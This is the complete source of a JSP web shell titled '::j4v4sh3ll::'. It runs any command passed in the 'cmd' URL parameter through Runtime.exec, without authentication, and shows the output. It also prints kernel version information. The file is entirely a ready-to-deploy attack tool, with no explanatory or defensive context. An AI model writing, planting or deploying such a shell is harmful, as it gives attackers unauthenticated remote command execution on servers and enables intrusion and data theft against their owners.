<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.util.*" import="java.io.*" import="java.lang.Runtime" import="javax.servlet.jsp.*"%>
<%
String cmdLine = pageContext.getRequest().getParameter("cmd");
if(cmdLine != null){
	Process p = Runtime.getRuntime().exec(cmdLine);
	DataInputStream procIn = new DataInputStream(p.getInputStream());
	int d = '\0';
	StringBuilder result = new StringBuilder();
	while ((d=procIn.read()) != -1) {
		result.append((char)d);
	}
	pageContext.setAttribute("result", result.toString());
} else
	pageContext.setAttribute("result", "command not found");
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<title>::j4v4sh3ll::</title>
</head>
<body>
<div class="container text-warning" style="margin-top: 100px !important; padding: 20px !important; background: #000;">
   <div class="row">
      <div class="col-sm-4"><!-- NO CONTENT --></div>
      <div class="col-sm-4">
		  <form class="form-horizontal" action="/" method="GET">
		    <div class="form-group">
		        <input type="text" class="form-control" placeholder="pwd" name="cmd">
		    </div>
		    <div class="form-group">        
		        <input type="submit" class="btn btn-default" value="Run">
		    </div>
		  </form>
      </div>
      <div class="col-sm-4"><!-- NO CONTENT --></div>
   </div>
   <div class="row">
       <div class="col-sm-12">
            <% if(pageContext.getRequest().getParameter("cmd") != null ){ %>
	        <pre class="text-center">
	            <%= pageContext.getAttribute("result") %>
	        </pre>
	        <% } %>
       </div>
   </div>
   <hr>
   <div class="row text-center">
      <div class="col-sm-4"><!-- NO CONTENT --></div>
      <div class="col-sm-4">
          <h4 class="text-warning">SYSTEM INFO</h4>
          <% Process defaultP = Runtime.getRuntime().exec("cat /proc/version");
          DataInputStream defaultProcIn = new DataInputStream(defaultP.getInputStream());
          int c='\0';
          StringBuilder systemInfo = new StringBuilder();
          while ((c=defaultProcIn.read()) != -1) {
        	  systemInfo.append((char)c);
          }
          pageContext.setAttribute("systemInfo", systemInfo.toString());
          %>
      </div>
      <div class="col-sm-4"><!-- NO CONTENT --></div>
   </div>
   <div class="row">
       <div class="col-sm-12">
	        <pre class="text-center">
	            <%= pageContext.getAttribute("systemInfo")%>
	        </pre>
       </div>
   </div>
</div>
</body>
</html>